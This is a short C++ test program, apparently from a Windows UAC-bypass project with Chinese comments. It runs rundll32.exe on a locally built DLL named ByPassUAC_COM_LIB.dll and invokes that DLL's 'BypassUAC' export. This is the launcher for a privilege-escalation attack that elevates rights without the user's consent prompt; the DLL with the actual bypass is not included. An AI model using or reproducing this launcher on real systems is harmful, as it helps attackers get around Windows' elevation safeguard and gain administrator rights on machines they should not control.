// BypassUAC_Test.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include<Windows.h>
#include<tchar.h>

int main()
{
	TCHAR szCmdLine[MAX_PATH] = { 0 };
	TCHAR szRundll32Path[MAX_PATH] = L"C:\\Windows\\System32\\rundll32.exe";
	TCHAR szDllPath[MAX_PATH] = L"E:\\WindowsProgramming\\x64\\Debug\\ByPassUAC_COM_LIB.dll";//替换为编译的dll路径
	wsprintf(szCmdLine, L"%s \"%s\" %s", szRundll32Path, szDllPath, L"BypassUAC");
	STARTUPINFO si{};
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi{};
	CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}